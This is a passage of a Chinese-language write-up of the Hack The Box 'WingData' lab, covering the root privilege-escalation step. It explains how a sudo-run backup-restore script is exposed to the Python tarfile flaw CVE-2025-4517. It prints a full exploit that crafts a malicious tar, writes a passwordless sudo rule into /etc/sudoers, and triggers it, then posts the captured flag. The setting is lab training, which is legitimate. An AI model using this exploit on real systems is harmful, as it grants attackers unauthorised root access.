<span class="subst">&#123;backup_path&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.restore_dir.startswith(<span class="string">&quot;restore_&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] --restore-dir must start with &#x27;restore_&#x27;&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    tag = args.restore_dir[<span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] --restore-dir must include a non-empty tag after &#x27;restore_&#x27;&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> validate_restore_tag(tag):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Backup: <span class="subst">&#123;args.backup&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Staging directory: <span class="subst">&#123;staging_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    os.makedirs(staging_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(backup_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">            tar.extractall(path=staging_dir, <span class="built_in">filter</span>=<span class="string">&quot;data&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Extraction completed in <span class="subst">&#123;staging_dir&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> (tarfile.TarError, OSError, Exception) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error during extraction: <span class="subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>漏洞点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar.extractall(path=staging_dir, filter=&quot;data&quot;)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>它只校验了 <strong>备份文件名</strong></li>
+<li><strong>没有校验 tar 包内部成员</strong></li>
+<li>直接对归档内容执行了解压</li>
+</ul>
+<p>Python 的 <code>tarfile</code> 文档里，<code>filter=&quot;data&quot;</code> 的设计目标确实是拒绝绝对路径、拒绝解压到目标目录外、并清理部分危险权限位。也就是它本来是“更安全的解压模式”。</p>
+<p>但问题在于，NVD 和 Red Hat 后续都记录了 <strong>Python 3.12+</strong> 的 <code>tarfile</code> 提取过滤器相关漏洞：即使使用 <code>filter=&quot;data&quot;</code> 或 <code>filter=&quot;tar&quot;</code>，在处理<strong>不可信 tar 包</strong>时，仍可能发生<strong>越界写入提取目录之外</strong>的问题。</p>
+<p>所以，这段脚本的风险判断可以概括成一句话：</p>
+<p><strong>如果攻击者能控制备份 tar 内容，而这个脚本又以更高权限运行，那么这里就是高风险点</strong></p>
+</blockquote>
+<h2 id="CVE-2025-4517"><a href="#CVE-2025-4517" class="headerlink" title="CVE-2025-4517"></a>CVE-2025-4517</h2><p>poc:<a target="_blank" rel="noopener" href="https://github.com/DesertDemons/CVE-2025-4138-4517-POC?tab=readme-ov-file#overview"><a target="_blank" rel="noopener" href="https://github.com/StealthByte0/CVE-2025-4517-poc/blob/main/CVE-2025-4517.py">CVE-2025-4517-poc&#x2F;CVE-2025-4517.py at main · StealthByte0&#x2F;CVE-2025-4517-poc</a></a></p>
+<p>写入exp脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /tmp/exploit.py &lt;&lt;<span class="string">&#x27;PY&#x27;</span></span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">comp = <span class="string">&#x27;d&#x27;</span> * <span class="number">247</span></span><br><span class="line">steps = <span class="string">&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">path = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;/tmp/backup_9999.tar&quot;</span>, mode=<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> steps:</span><br><span class="line">        a = tarfile.TarInfo(os.path.join(path, comp))</span><br><span class="line">        a.<span class="built_in">type</span> = tarfile.DIRTYPE</span><br><span class="line">        tar.addfile(a)</span><br><span class="line">        </span><br><span class="line">        b = tarfile.TarInfo(os.path.join(path, i))</span><br><span class="line">        b.<span class="built_in">type</span> = tarfile.SYMTYPE</span><br><span class="line">        b.linkname = comp</span><br><span class="line">        tar.addfile(b)</span><br><span class="line">        </span><br><span class="line">        path = os.path.join(path, comp)</span><br><span class="line">    </span><br><span class="line">    linkpath = os.path.join(<span class="string">&quot;/&quot;</span>.join(steps), <span class="string">&quot;l&quot;</span>*<span class="number">254</span>)</span><br><span class="line">    l = tarfile.TarInfo(linkpath)</span><br><span class="line">    l.<span class="built_in">type</span> = tarfile.SYMTYPE</span><br><span class="line">    l.linkname = <span class="string">&quot;../&quot;</span> * <span class="built_in">len</span>(steps)</span><br><span class="line">    tar.addfile(l)</span><br><span class="line">    </span><br><span class="line">    e = tarfile.TarInfo(<span class="string">&quot;escape&quot;</span>)</span><br><span class="line">    e.<span class="built_in">type</span> = tarfile.SYMTYPE</span><br><span class="line">    e.linkname = linkpath + <span class="string">&quot;/../../../../../../../etc&quot;</span></span><br><span class="line">    tar.addfile(e)</span><br><span class="line">    </span><br><span class="line">    f = tarfile.TarInfo(<span class="string">&quot;sudoers_link&quot;</span>)</span><br><span class="line">    f.<span class="built_in">type</span> = tarfile.LNKTYPE</span><br><span class="line">    f.linkname = <span class="string">&quot;escape/sudoers&quot;</span></span><br><span class="line">    tar.addfile(f)</span><br><span class="line">    </span><br><span class="line">    content = <span class="string">b&quot;wacky ALL=(ALL) NOPASSWD: ALL\n&quot;</span></span><br><span class="line">    c = tarfile.TarInfo(<span class="string">&quot;sudoers_link&quot;</span>)</span><br><span class="line">    c.<span class="built_in">type</span> = tarfile.REGTYPE</span><br><span class="line">    c.size = <span class="built_in">len</span>(content)</span><br><span class="line">    tar.addfile(c, fileobj=io.BytesIO(content))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit created&quot;</span>)</span><br><span class="line">PY</span><br></pre></td></tr></table></figure>
+
+<p>生成恶意 tar 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /tmp/exploit.py</span><br></pre></td></tr></table></figure>
+
+<p>复制这个恶意的tar文件到sudo权限的目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /tmp/backup_9999.tar /opt/backup_clients/backups/</span><br></pre></td></tr></table></figure>
+
+<p>运行 sudo 脚本触发漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \</span><br><span class="line">  -b backup_9999.tar \            </span><br><span class="line">  -r restore_evil</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-b backup_9999.tar</code> &#x3D; 指定要恢复的备份包名字是 <code>backup_9999.tar</code></li>
+<li><code>-r restore_evil</code> &#x3D; 指定恢复到 <code>restore_evil</code> 这个目录</li>
+</ul>
+<p><img src="/img/htb/htb-wingdata-017.png" alt="image-20260322144850777"></p>
+<p>sudo -l</p>
+<p>sudo su</p>
+<p><img src="/img/htb/htb-wingdata-018.png" alt="image-20260322145020484"></p>
+<p>拿到flag 2： c1a6f37882dc5883a8dad98e0b2197aa</p>
+<p><img src="/img/htb/htb-wingdata-019.png" alt="image-20260322150013997"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Echoin-613">Echoin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://echoin.xyz/2026/08/24/htb-wingdata/">https://echoin.xyz/2026/08/24/htb-wingdata/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://echoin.xyz" target="_blank">Echoin 的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/WingData/">WingData</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/butterfly-extsrc/sharejs/dist/css/share.min.css?v=1.1.6" media="print" onload="this.media='all'"><script src="/pluginsSrc/butterfly-extsrc/sharejs/dist/js/social-share.min.js?v=1.1.6" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/08/24/htb-garfield/" title="HTB Garfield 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">HTB Garfield 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">靶场信息：账号为 j.arbuckle &#x2F; Th1sD4mnC4t！@1978 nmap1nmap -sV -sT 10.129.241.39 -A  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061┌──(echoin㉿kali)-[~]└─$ nmap -sV -sT 10.129.241.39 -AStarting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 18:43 CSTNmap scan report for garfield.htb (10.129.241.39)Host is up (0.72s latency).Not shown: 986 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53/tcp   open  domain       ...</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-three/" title="HTB Three 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">HTB Three 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">HTB-Three1echo &quot;10.129.227.248 s3.thetoppers.htb&quot; | sudo tee -a /etc/hosts  nmap 1nmap -sV 10.129.227.248   访问ip可知 可以看到一个静态网页，其中有一个演唱会门票预订部分，但它无法使用。查看网页的源代码显示，“联系”表单将请求提交到一个 PHP 页面 &#x2F;action_page.php，这表明该 web 应用程序的服务器端是使用 PHP 构建的  发现一个域名  扫子域名（工具：gobuster） 1gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -append-domain   扫到了：s3.thetoppers.htb和gc._msdcs.thetoppers.htb 添加到主机 1echo &quot;10.129.62.175 thetoppers....</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/08/24/htb-fires/" title="HTB Fires 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB Fires 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">靶场已知信息： d.cooper@fries.htb &#x2F; D4LE11maan!! nmap12345678910111213141516171819202122232425262728┌──(echoin㉿kali)-[~]└─$ nmap -sV -sT 10.129.244.72                 Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-27 20:49 CSTNmap scan report for fries.htb (10.129.244.72)Host is up (0.17s latency).Not shown: 984 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)53/tcp   open  domain  ...</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-kobold/" title="HTB Kobold 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB Kobold 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">Nmap1nmap -sV 10.129.127.169 -A    3个开放端口：SSH （22）、HTTP（80，重定向为HTTPS）、HTTPS （443） Ubuntu 上的 nginx 1.24.0 通配符TLS证书——表示带有子域名的虚拟主机路由*.kobold.htb 80号端口重定向至https://kobold.htb/  (将机器主机名添加到本地主机文件中： 1echo &quot;10.129.127.169 kobold.htb mcp.kobold.htb bin.kobold.htb&quot; | sudo tee -a /etc/hosts  10.129.245.50   (一开始因为是https,所以证书不受信任，在 Firefox 里点 Advanced 后继续访问)  子域枚举1234ffuf -c -k -u &#x27;https://10.129.127.169/&#x27; \-H &#x27;Host: FUZZ.target.htb&#x27; \-w ~/SecLists/Discovery/DNS/combined_subd...</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-conversor/" title="HTB Conversor 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB Conversor 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">Nmap1nmap -sV 10.129.238.31  22,80 将机器主机名添加到本地主机文件中： 1echo &quot;10.129.238.31 conversor.htb&quot; | sudo tee -a /etc/hosts  10.129.238.31  注册登录之后进入   下载源码后： tar -xvf source_code.tar.gz 解压 install.md:   每分钟执行&#x2F;var&#x2F;www&#x2F;conversor.htb&#x2F;scripts 下的py文件 XSLT 注入利用xlst的EXSLT拓展往这个目录下写py脚本弹shell  EXSLT，即可扩展样式表语言转换，是对XSLT（可扩展样式表语言转换）语言的一组扩展。EXSLT，即可扩展样式表语言转换，是对XSLT（可扩展样式表语言转换）语言的一组扩展。  参考：https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#write-files-with-exslt-extens...</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-devarea/" title="HTB DevArea 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB DevArea 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">DevAreanmap1nmap -sS -sV 10.129.116.255   PORT     STATE SERVICE VERSION21&#x2F;tcp   open  ftp     vsftpd 3.0.5       文件传输服务22&#x2F;tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)    远程登录80&#x2F;tcp   open  http    Apache httpd 2.4.58        web服务器8080&#x2F;tcp open  http    Jetty 9.4.27.v20200227      Jatty容器8500&#x2F;tcp open  http    Golang net&#x2F;http server    代理服务器go写的8888&#x2F;tcp open  http    Golang net&#x2F;http server (Go-IPFS json-rpc or Influ...</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-three/" title="HTB Three 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB Three 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">HTB-Three1echo &quot;10.129.227.248 s3.thetoppers.htb&quot; | sudo tee -a /etc/hosts  nmap 1nmap -sV 10.129.227.248   访问ip可知 可以看到一个静态网页，其中有一个演唱会门票预订部分，但它无法使用。查看网页的源代码显示，“联系”表单将请求提交到一个 PHP 页面 &#x2F;action_page.php，这表明该 web 应用程序的服务器端是使用 PHP 构建的  发现一个域名  扫子域名（工具：gobuster） 1gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -append-domain   扫到了：s3.thetoppers.htb和gc._msdcs.thetoppers.htb 添加到主机 1echo &quot;10.129.62.175 thetoppers....</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-garfield/" title="HTB Garfield 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB Garfield 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">靶场信息：账号为 j.arbuckle &#x2F; Th1sD4mnC4t！@1978 nmap1nmap -sV -sT 10.129.241.39 -A  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061┌──(echoin㉿kali)-[~]└─$ nmap -sV -sT 10.129.241.39 -AStarting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 18:43 CSTNmap scan report for garfield.htb (10.129.241.39)Host is up (0.72s latency).Not shown: 986 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53/tcp   open  domain       ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Echoin</div><div class="author-info-description">Web安全 · 渗透测试 · CTF · 靶场</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Echoin-613"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Echoin-613" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #8b7cf6;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的安全博客，一起学习 Web 安全与渗透测试！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-47812"><span class="toc-number">2.</span> <span class="toc-text">[CVE-2025-47812]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lua%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">Lua注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash"><span class="toc-number">4.</span> <span class="toc-text">爆破hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-4517"><span class="toc-number">7.</span> <span class="toc-text">CVE-2025-4517</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/24/ctf-mlops-ssrf-hardlink/" title="mlops - URL解析差异SSRF + hardlink恢复缺陷 + 配置文件注入">mlops - URL解析差异SSRF + hardlink恢复缺陷 + 配置文件注入</a><time datetime="2026-08-24T15:30:00.000Z" title="发表于 2026-08-24 23:30:00">2026-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/24/ctf-go-to-php-http-smuggling/" title="go to php - HTTP 请求走私">go to php - HTTP 请求走私</a><time datetime="2026-08-24T15:15:00.000Z" title="发表于 2026-08-24 23:15:00">2026-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/24/ctf-stored-xss-admin-bot/" title="存储型 XSS 注入 + Admin Bot 提权 + XSS 外带">存储型 XSS 注入 + Admin Bot 提权 + XSS 外带</a><time datetime="2026-08-24T15:00:00.000Z" title="发表于 2026-08-24 23:00:00">2026-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/24/htb-nanocorp/" title="HTB NanoCorp 靶场 Writeup">HTB NanoCorp 靶场 Writeup</a><time datetime="2026-08-24T14:00:00.000Z" title="发表于 2026-08-24 22:00:00">2026-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/24/htb-garfield/" title="HTB Garfield 靶场 Writeup">HTB Garfield 靶场 Writeup</a><time datetime="2026-08-24T13:45:00.000Z" title="发表于 2026-08-24 21:45:00">2026-08-24</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Echoin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script src="/js/cursor.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="/pluginsSrc/butterfly-extsrc/dist/fireworks.min.js?v=1.1.6"></script><script id="canvas_nest" defer="defer" color="167,139,250" opacity="0.6" zIndex="-1" count="99" mobile="false" src="/pluginsSrc/butterfly-extsrc/dist/canvas-nest.min.js?v=1.1.6"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.0"></script></div></div></body></html>
